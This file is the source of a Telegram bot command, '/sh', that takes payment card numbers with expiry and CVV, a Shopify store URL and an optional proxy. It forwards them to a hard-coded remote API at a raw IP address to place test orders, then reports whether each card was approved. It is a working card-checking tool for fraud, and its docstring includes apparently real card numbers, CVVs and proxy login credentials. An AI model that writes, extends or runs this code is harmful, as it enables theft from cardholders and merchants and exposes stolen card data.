# commands/shopify.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import urllib.parse

router = Router()

async def run_sync(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

@router.message(Command("sh"))
async def cmd_shopify(message: types.Message):
    """
    Usage: /sh CC|MM|YY|CVV <site> [proxy]
    Example: /sh 5449285929836687|11|26|169 https://us-auto-supplies.myshopify.com
    Example with proxy: /sh 5449285929836687|11|26|169 https://us-auto-supplies.myshopify.com co-bog.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1e
    """
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(
            "❌ **Usage:** `/sh CC|MM|YY|CVV <site_url> [proxy]`\n"
            "Example: `/sh 4111111111111111|12|28|123 https://example.myshopify.com`\n"
            "Proxy format: `host:port:user:pass`"
        )
        return

    args = parts[1].strip().split()
    if len(args) < 2:
        await message.answer("❌ Please provide card and site URL.\nExample: `/sh 5449285929836687|11|26|169 https://us-auto-supplies.myshopify.com`")
        return

    card_str = args[0]
    site = args[1]
    proxy = args[2] if len(args) > 2 else None

    # Validate card format
    try:
        cc, mm, yy, cvv = [x.strip() for x in card_str.split('|')]
        if len(yy) == 2:
            yyyy = str(2000 + int(yy))
        else:
            yyyy = yy
        # Reconstruct for API: original format with 2-digit year is fine
        card_api = f"{cc}|{mm}|{yy}|{cvv}"
    except Exception:
        await message.answer("❌ Invalid card format. Use: `CC|MM|YY|CVV` (year can be 2 or 4 digits)")
        return

    # Validate site URL
    if not site.startswith("http"):
        site = "https://" + site

    # Build API URL
    base_api = "http://162.217.248.95:8000/"
    params = {
        "gate": "autoshopii",
        "key": "BlackxCard",
        "cc": card_api,
        "site": site
    }
    if proxy:
        params["proxy"] = proxy

    # Send progress message
    progress = await message.answer("⏳ **Checking Shopify...**")

    try:
        # Make request to the API
        url = base_api + "?" + urllib.parse.urlencode(params)
        resp = await run_sync(requests.get, url, timeout=30)

        if resp.status_code != 200:
            await progress.edit_text(f"❌ **API error** (HTTP {resp.status_code})\n```\n{resp.text[:300]}\n```")
            return

        # Parse JSON response
        try:
            data = resp.json()
        except:
            await progress.edit_text(f"❌ **Invalid API response**\n```\n{resp.text[:300]}\n```")
            return

        # Check for success indication
        response_text = data.get("Response", "")
        if "Order completed" in response_text or "Success" in response_text:
            # Success
            result = (
                f"✅ **ORDER COMPLETED**\n"
                f"💳 **Card:** `{data.get('CC', card_api)}`\n"
                f"💰 **Price:** ${data.get('Price', 'Unknown')}\n"
                f"🏪 **Gate:** {data.get('Gate', 'Shopify Payments')}\n"
                f"🔗 **Site:** {data.get('Site', site)}\n"
            )
            await progress.edit_text(result)
        else:
            # Failure – show the response message
            await progress.edit_text(
                f"❌ **DECLINED / ERROR**\n"
                f"📦 **Response:** {response_text}\n"
                f"💳 **Card:** `{card_api}`\n"
                f"🔗 **Site:** {site}\n"
            )
    except asyncio.TimeoutError:
        await progress.edit_text("❌ **Timeout** – API did not respond in time.")
    except Exception as e:
        await progress.edit_text(f"❌ **Exception:** {str(e)}")
